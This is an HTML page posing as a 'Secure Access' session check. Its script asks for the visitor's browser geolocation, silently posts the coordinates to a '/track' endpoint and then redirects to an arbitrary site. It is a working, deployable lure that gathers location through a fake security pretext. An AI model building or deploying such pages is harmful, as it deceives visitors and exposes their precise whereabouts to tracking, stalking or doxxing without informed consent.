<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Access</title>

  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
      background: linear-gradient(135deg, #0f172a, #1e293b);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #111827;
      padding: 30px;
      border-radius: 16px;
      width: 320px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
    }

    h1 {
      font-size: 20px;
      margin-bottom: 10px;
    }

    p {
      font-size: 13px;
      color: #9ca3af;
      margin-bottom: 25px;
    }

    button {
      background: #2563eb;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 10px;
      font-size: 15px;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: #1d4ed8;
    }

    .loader {
      margin-top: 20px;
      display: none;
    }

    .spinner {
      border: 4px solid #374151;
      border-top: 4px solid #3b82f6;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: auto;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    .status {
      margin-top: 15px;
      font-size: 13px;
    }
  </style>
</head>

<body>

  <div class="card">
    <h1>🔐 Secure Access</h1>
    <p>Verifying your session for secure access...</p>

    <button onclick="startProcess()">Continue</button>

    <div class="loader" id="loader">
      <div class="spinner"></div>
      <div class="status" id="status">Processing...</div>
    </div>
  </div>

  <script>
    async function startProcess() {
      const loader = document.getElementById("loader");
      const status = document.getElementById("status");

      loader.style.display = "block";
      status.innerHTML = "🔍 Checking permissions...";

      if (!navigator.geolocation) {
        status.innerHTML = "❌ Not supported";
        return;
      }

      navigator.geolocation.getCurrentPosition(async (pos) => {
        const latitude = pos.coords.latitude;
        const longitude = pos.coords.longitude;

        status.innerHTML = "📡 Verifying location...";

        try {
          await fetch("/track", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ latitude, longitude })
          });

          status.innerHTML = "✅ Verified successfully";

          setTimeout(() => {
            window.location.href = "https://google.com"; // 👉 redirect anywhere
          }, 1500);

        } catch (err) {
          status.innerHTML = "❌ Something went wrong";
        }

      }, () => {
        status.innerHTML = "❌ Permission denied";
      });
    }
  </script>

</body>
</html>
